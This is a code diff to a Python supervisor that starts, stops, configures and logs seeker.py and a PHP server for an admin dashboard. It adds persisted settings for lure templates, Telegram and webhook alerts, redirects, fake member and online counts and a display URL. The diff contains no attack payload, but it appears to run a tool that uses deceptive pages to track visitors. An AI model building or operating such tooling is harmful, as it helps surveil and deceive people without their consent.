@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Tracker Service Supervisor
-Controls starting, stopping, and monitoring seeker.py and PHP server
+Controls starting, stopping, configuring, and monitoring seeker.py and PHP server
 via REST API for the Admin Dashboard.
 """
 
@@ -19,14 +19,53 @@ PID_FILE = os.path.join(BASE_DIR, 'pid')
 TEMPLATES_JSON = os.path.join(BASE_DIR, 'template', 'templates.json')
 LOG_DIR = os.path.join(BASE_DIR, 'logs')
 RUNTIME_LOG = os.path.join(LOG_DIR, 'seeker_runtime.log')
+CONFIG_FILE = os.path.join(BASE_DIR, 'db', 'config.json')
 
 tracker_process = None
-current_config = {
+
+DEFAULT_CONFIG = {
     "template_id": 0,
     "template_name": "NearYou",
     "port": 8080,
+    "telegram": "",
+    "webhook": "",
+    "debug_http": True,
+    "kml": "",
+    "redirect": "",
+    "title": "",
+    "image": "",
+    "desc": "",
+    "sitename": "",
+    "mem_num": "",
+    "online_num": "",
+    "display_url": "",
     "started_at": None,
 }
+
+current_config = DEFAULT_CONFIG.copy()
+
+
+def load_config():
+    global current_config
+    if os.path.exists(CONFIG_FILE):
+        try:
+            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
+                saved = json.load(f)
+                merged = DEFAULT_CONFIG.copy()
+                merged.update(saved)
+                return merged
+        except Exception:
+            pass
+    return DEFAULT_CONFIG.copy()
+
+
+def save_config(cfg):
+    try:
+        os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
+        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
+            json.dump(cfg, f, indent=2)
+    except Exception as e:
+        print(f"[!] Warning: Could not save config to {CONFIG_FILE}: {e}")
 
 
 def get_templates():
@@ -79,22 +118,39 @@ def is_tracker_running():
     return False
 
 
+def get_tracker_logs(max_lines=100):
+    if not os.path.exists(RUNTIME_LOG):
+        return []
+    try:
+        with open(RUNTIME_LOG, 'r', encoding='utf-8', errors='replace') as f:
+            lines = f.readlines()
+            return [line.rstrip() for line in lines[-max_lines:] if line.strip()]
+    except Exception:
+        return []
+
+
+def clear_tracker_logs():
+    try:
+        if os.path.exists(RUNTIME_LOG):
+            with open(RUNTIME_LOG, 'w', encoding='utf-8') as f:
+                f.write(f"=== Logs cleared at {datetime.now()} ===\n")
+            return True
+    except Exception:
+        pass
+    return False
+
+
 def get_tracker_status():
+    global current_config
     running = is_tracker_running()
     templates = get_templates()
-    t_id = current_config.get('template_id', 0)
-    t_name = current_config.get('template_name', 'NearYou')
-    port = current_config.get('port', 8080)
+    saved_cfg = load_config()
+
+    t_id = current_config.get('template_id', saved_cfg.get('template_id', 0))
+    t_name = current_config.get('template_name', saved_cfg.get('template_name', 'NearYou'))
+    port = current_config.get('port', saved_cfg.get('port', 8080))
     
-    # Read last few log lines
-    last_logs = []
-    if os.path.exists(RUNTIME_LOG):
-        try:
-            with open(RUNTIME_LOG, 'r', encoding='utf-8', errors='replace') as f:
-                lines = f.readlines()
-                last_logs = [line.strip() for line in lines[-15:] if line.strip()]
-        except Exception:
-            pass
+    logs = get_tracker_logs(30)
 
     return {
         "running": running,
@@ -103,12 +159,13 @@ def get_tracker_status():
         "port": port,
         "url": f"http://0.0.0.0:{port}",
         "started_at": current_config.get('started_at'),
+        "config": saved_cfg,
         "templates": templates,
-        "logs": last_logs
+        "logs": logs
     }
 
 
-def start_tracker(template_id=0, port=8080, custom_env=None):
+def start_tracker(config_dict=None):
     global tracker_process, current_config
     
     # Stop existing instance if running
@@ -124,28 +181,55 @@ def start_tracker(template_id=0, port=8080, custom_env=None):
         except Exception:
             pass
 
+    # Merge with saved config or defaults
+    cfg = load_config()
+    if config_dict and isinstance(config_dict, dict):
+        cfg.update(config_dict)
+
+    template_id = int(cfg.get('template_id', 0))
+    port = int(cfg.get('port', 8080))
+
     templates = get_templates()
     template_name = "NearYou"
     for t in templates:
         if t["id"] == template_id:
             template_name = t["name"]
             break
+    cfg['template_name'] = template_name
 
     # Build environment variables
     env = os.environ.copy()
     env['PORT'] = str(port)
     env['TEMPLATE'] = str(template_id)
-    env['DEBUG_HTTP'] = '1'
+    env['DEBUG_HTTP'] = '1' if cfg.get('debug_http', True) else '0'
 
-    # Support template parameters
-    if custom_env and isinstance(custom_env, dict):
-        for k, v in custom_env.items():
-            if v is not None and str(v).strip():
-                env[k] = str(v).strip()
+    # Optional notifications & parameters
+    param_keys = [
+        'TELEGRAM', 'WEBHOOK', 'KML',
+        'REDIRECT', 'TITLE', 'IMAGE', 'DESC',
+        'SITENAME', 'MEM_NUM', 'ONLINE_NUM', 'DISPLAY_URL'
+    ]
+    for key in param_keys:
+        lower_key = key.lower()
+        val = cfg.get(lower_key) or cfg.get(key)
+        if val is not None and str(val).strip():
+            env[key] = str(val).strip()
 
-    # Open log file
-    log_fp = open(RUNTIME_LOG, 'w', encoding='utf-8')
-    log_fp.write(f"=== Starting Seeker Template {template_name} (#{template_id}) on port {port} at {datetime.now()} ===\n")
+    # Save active config
+    cfg['started_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    save_config(cfg)
+    current_config = cfg
+
+    # Open runtime log file
+    log_fp = open(RUNTIME_LOG, 'a', encoding='utf-8')
+    log_fp.write(f"\n=======================================================\n")
+    log_fp.write(f"[+] Launching Seeker ({template_name} - Template #{template_id}) on port {port}\n")
+    log_fp.write(f"[+] Started at: {cfg['started_at']}\n")
+    if env.get('TELEGRAM'):
+        log_fp.write(f"[+] Telegram Alerts: ENABLED\n")
+    if env.get('WEBHOOK'):
+        log_fp.write(f"[+] Webhook Alerts: ENABLED\n")
+    log_fp.write(f"=======================================================\n")
     log_fp.flush()
 
     cmd = [sys.executable, os.path.join(BASE_DIR, 'seeker.py'), '-t', str(template_id), '-p', str(port)]
@@ -157,13 +241,6 @@ def start_tracker(template_id=0, port=8080, custom_env=None):
         stdout=log_fp,
         stderr=subprocess.STDOUT
     )
-
-    current_config = {
-        "template_id": template_id,
-        "template_name": template_name,
-        "port": port,
-        "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-    }
 
     # Wait briefly to let seeker and php start
     time.sleep(2)
@@ -208,7 +285,7 @@ def stop_tracker():
                 except Exception:
                     pass
 
-    # 3. Kill any lingering seeker.py or php processes on the port
+    # 3. Kill any lingering seeker.py or php processes
     port = current_config.get('port', 8080)
     for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
         try:
@@ -219,4 +296,13 @@ def stop_tracker():
             pass
 
     current_config["started_at"] = None
+
+    # Log stoppage
+    if os.path.exists(RUNTIME_LOG):
+        try:
+            with open(RUNTIME_LOG, 'a', encoding='utf-8') as f:
+                f.write(f"\n[!] Tracker stopped at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        except Exception:
+            pass
+
     return get_tracker_status()
